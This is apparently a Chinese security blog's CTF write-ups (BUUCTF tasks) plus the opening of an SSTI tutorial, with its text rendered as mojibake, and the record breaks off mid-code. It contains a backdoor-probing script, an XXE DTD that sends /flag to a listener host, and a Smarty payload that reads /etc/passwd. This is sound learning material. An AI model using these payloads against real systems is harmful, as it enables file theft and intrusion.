      <url>2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>è®°ä¸€ä¸‹ç»¼åˆé¢˜ç›®çš„writeup!</p><a id="more"></a><h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>ä¸‹è½½<code>www.tar.gz</code>å‘ç°æ˜¯3000å¤šä¸ªphpåé—¨æ–‡ä»¶ï¼Œä¸è¿‡éƒ½æ˜¯æ‰§è¡Œä»£ç çš„ï¼Œå†™ä¸ªè„šæœ¬è·‘ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;å¼€å§‹æ—¶é—´ï¼š  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)    <span class="comment">#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span></span><br><span class="line">filePath = <span class="string">r&quot;C:/Users/Desktop/www/src&quot;</span></span><br><span class="line">os.chdir(filePath)<span class="comment">#æ”¹å˜å½“å‰çš„è·¯å¾„</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span><span class="comment">#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span></span><br><span class="line">            gets = list(re.findall(<span class="string">r&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">r&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;<span class="comment">#æ‰€æœ‰çš„$_POST</span></span><br><span class="line">    params = &#123;&#125;<span class="comment">#æ‰€æœ‰çš„$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)<span class="comment">#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span></span><br><span class="line">    req.close()<span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:<span class="comment">#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()<span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()<span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:<span class="comment">#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#x27;</span>+file+<span class="string">&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;ç»“æŸæ—¶é—´ï¼š  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:<span class="comment">#åŠ å…¥å¤šçº¿ç¨‹</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è‡ªå·±å†™äº†å¥½ä¹…éƒ½æ²¡æˆåŠŸè·‘å‡ºæ¥ï¼Œä¹Ÿæ‡’å¾—å†æ”¹äº†ï¼Œç›´æ¥å‚è€ƒå¤§ä½¬çš„exp</p><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-filejava"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-filejava" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava</h2><p>java webé¡¹ç›®ç›®å½•ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">webapps    # å«Webåº”ç”¨çš„ç¨‹åº(JSPã€Servletå’ŒJavaBeanç­‰)</span><br><span class="line">webapps/META-INF/#å­˜æ”¾ä¸€äº›meta informationç›¸å…³çš„æ–‡ä»¶</span><br><span class="line">webapps/WEB-INF/classes/    #ç”¨äºå­˜æ”¾javaå­—èŠ‚ç æ–‡ä»¶</span><br><span class="line">webapps/WEB-INF/lib/    #ç”¨äºå­˜æ”¾è¯¥å·¥ç¨‹ç”¨åˆ°çš„åº“ï¼Œä¾‹å¦‚servlet-api.jarç­‰ç­‰</span><br><span class="line">webapps/WEB-INF/web.xml    #webå·¥ç¨‹çš„é…ç½®æ–‡ä»¶ï¼Œå®Œæˆç”¨æˆ·è¯·æ±‚çš„é€»è¾‘åç§°åˆ°çœŸæ­£çš„servletç±»çš„æ˜ å°„</span><br></pre></td></tr></table></figure><h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>æŸ¥çœ‹æºç å‘ç°æç¤ºflagåœ¨<code>/flag</code>,æµè§ˆå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°ä¸Šä¼ jsp webshellï¼Œä½†æ˜¯ä¸çŸ¥é“è·¯å¾„ï¼Œä¸Šä¼ å®Œä¹‹åå‘ç°å¯ä»¥ä¸‹è½½ï¼Œè¿™é‡Œå°±å­˜åœ¨ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIMæˆªå›¾20200510231429.png" style="zoom:80%;"><p>è¯•ç€å»è¯»<code>WEB-INF/web.xml</code></p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIMæˆªå›¾20200510231631.png" style="zoom:80%;"><p>æ ¹æ®è¿™ä¸ªåŒ…çš„è·¯å¾„å»ä¸‹è½½<code>.class</code>æ–‡ä»¶ï¼Œç”±äºè¿™ä¸ªæ˜¯å­—èŠ‚ç æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦åç¼–è¯‘ä¸€ä¸‹ï¼Œå‘ç°</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIMæˆªå›¾20200510234936.png" style="zoom:80%;"><p>åˆ©ç”¨EXCELè¿›è¡ŒXXEæ”»å‡»ï¼š<a href="https://xz.aliyun.com/t/3741">https://xz.aliyun.com/t/3741</a></p><p>æˆ‘ä»¬å°±å¯ä»¥xxeäº†ï¼Œå¦‚ä¸‹æ„é€ ï¼š</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIMæˆªå›¾20200510235326.png" style="zoom:67%;"><p>vpsä¸Šçš„test.dtdï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>æœ€åä¸Šä¼ ä»¥ç±»ä¼¼äº<code>excel-1.xlsx</code>çš„åå­—ä¸Šä¼ ï¼Œå°±èƒ½æ”¶åˆ°flagäº†</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIMæˆªå›¾20200510235915.png" style="zoom:80%;"><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>è¿™é¢˜ç›¸å¯¹äºå‰ä¸€é¢˜å°±æ¯”è¾ƒç®€å•äº†</p><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œæš´åŠ›ç ´è§£å‘ç°å¯†ç æ˜¯<code>admin888</code>ï¼Œç™»é™†è¿›å»æç¤ºflagä¸åœ¨è¿™</p><p>ç™»é™†é¡µé¢æœ‰ä¸ªhelpï¼Œæ‰“å¼€æç¤º<code>java.io.FileNotFoundException</code>ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯è¯»æ–‡ä»¶çš„</p><p>ç›´æ¥è®¿é—®<code>/help.docx</code>ï¼Œå‘ç°å¯ä»¥æŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼ŒçŒœæµ‹å¯ä»¥ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œä½†GETä¸èƒ½ï¼Œä¸æ¸…æ¥šä¸ºå•¥</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIMæˆªå›¾20200515154314.png" style="zoom:80%;"><p>è¯»ä¸‹<code>WEB-INF/web.xml</code> ï¼Œçœ‹åˆ°</p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIMæˆªå›¾20200515154514.png" style="zoom:80%;"><p>è¯»ä¸‹æºç <code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIMæˆªå›¾20200515154752.png" style="zoom:80%;"><p>base64è§£å¯†å°±èƒ½å¾—åˆ°flagï¼Œä¹Ÿå¯ä»¥åç¼–è¯‘ä¸€ä¸‹çœ‹ä¸‹ä»£ç </p><img src="/2020/02/13/buuctf%E5%88%B7%E9%A2%98-%E7%BB%BC%E5%90%88%E7%AF%87/TIMæˆªå›¾20200515155046.png" style="zoom:80%;">]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´</title>
      <link href="2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼ï¼</p><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯æ¨¡æ¿æ³¨å…¥ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ¨¡æ¿æ³¨å…¥ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ¨¡æ¿æ³¨å…¥ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ¨¡æ¿æ³¨å…¥ï¼Ÿ</h2><p>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥(SSTI)ï¼Œå…¨ç§°Server-Side Template Injectionï¼Œä¸æˆ‘ä»¬ç†ŸçŸ¥çš„SQLæ³¨å…¥ã€å‘½ä»¤æ³¨å…¥ç­‰åŸç†å¤§åŒå°å¼‚ï¼Œå½“ç”¨æˆ·çš„è¾“å…¥æ•°æ®æ²¡æœ‰è¢«åˆç†çš„å¤„ç†æ§åˆ¶æ—¶ï¼Œå°±æœ‰å¯èƒ½æ•°æ®æ’å…¥äº†ç¨‹åºæ®µä¸­å˜æˆäº†ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œæ”¹å˜äº†ç¨‹åºçš„æ‰§è¡Œé€»è¾‘ã€‚</p><h2 id="å¸¸è§çš„æ¨¡æ¿å¼•æ“"><a href="#å¸¸è§çš„æ¨¡æ¿å¼•æ“" class="headerlink" title="å¸¸è§çš„æ¨¡æ¿å¼•æ“"></a>å¸¸è§çš„æ¨¡æ¿å¼•æ“</h2><p><strong>å„æ¡†æ¶æ¨¡æ¿ç»“æ„ï¼š</strong></p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/t01f4792c7d03dd49cc.png" style="zoom:150%;"><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h4><p>Smartyæ˜¯æœ€æµè¡Œçš„PHPæ¨¡æ¿è¯­è¨€ä¹‹ä¸€ï¼Œä¸ºä¸å—ä¿¡ä»»çš„æ¨¡æ¿æ‰§è¡Œæä¾›äº†å®‰å…¨æ¨¡å¼ã€‚è¿™ä¼šå¼ºåˆ¶æ‰§è¡Œåœ¨ php å®‰å…¨å‡½æ•°ç™½åå•ä¸­çš„å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ¨¡æ¿ä¸­æ— æ³•ç›´æ¥è°ƒç”¨ php ä¸­ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°(ç›¸å½“äºå­˜åœ¨äº†ä¸€ä¸ªdisable_function)</p><p>ä½†æ˜¯ï¼Œå®é™…ä¸Šå¯¹è¯­è¨€çš„é™åˆ¶å¹¶ä¸èƒ½å½±å“æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºæˆ‘ä»¬é¦–å…ˆè€ƒè™‘çš„åº”è¯¥æ˜¯æ¨¡æ¿æœ¬èº«ï¼Œæ°å¥½ Smarty å¾ˆç…§é¡¾æˆ‘ä»¬ï¼Œåœ¨é˜…è¯»<a href="https://github.com/smarty-php/smarty">æ¨¡æ¿çš„æ–‡æ¡£</a>ä»¥åæˆ‘ä»¬å‘ç°ï¼š$smartyå†…ç½®å˜é‡å¯ç”¨äºè®¿é—®å„ç§ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨ self å¾—åˆ° smarty è¿™ä¸ªç±»ä»¥åæˆ‘ä»¬å°±å»æ‰¾ smarty ç»™æˆ‘ä»¬çš„çš„æ–¹æ³•ã€‚</p><p><strong><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params">$variable</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $_result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $fp = fopen($variable, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ($fp) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            $_result .= $current_line;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $_result;</span><br><span class="line">    &#125;</span><br><span class="line">    $smarty = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;smarty) ? <span class="keyword">$this</span>-&gt;smarty : <span class="keyword">$this</span>;</span><br><span class="line">    <span class="keyword">if</span> ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . $variable . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•è¯»æ–‡ä»¶ï¼Œpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p><strong><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes file in a safe way to disk</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_filepath complete filepath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_contents file content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  Smarty $smarty    smarty instance</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> SmartyException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params">$_filepath, $_contents, Smarty $smarty</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $_error_reporting = error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            $old_umask = umask(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath = dirname($_filepath);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> ($_dirpath !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : $smarty-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        $_tmp_file = $_dirpath . DS . str_replace(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, uniqid(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Windows&#x27; rename() fails if the destination exists,</span></span><br><span class="line"><span class="comment">         * Linux&#x27; rename() properly handles the overwrite.</span></span><br><span class="line"><span class="comment">         * Simply unlink()ing a file might cause other processes</span></span><br><span class="line"><span class="comment">         * currently reading that file to fail, but linux&#x27; rename()</span></span><br><span class="line"><span class="comment">         * seems to be smart enough to handle that for us.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($smarty-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>writeFile</code>å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°ä¸€ä¸ª <code>Smarty</code> ç±»å‹ï¼Œåæ¥æ‰¾åˆ°äº† <code>self::clearConfig()</code>ï¼Œå‡½æ•°åŸå‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params">$varname = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 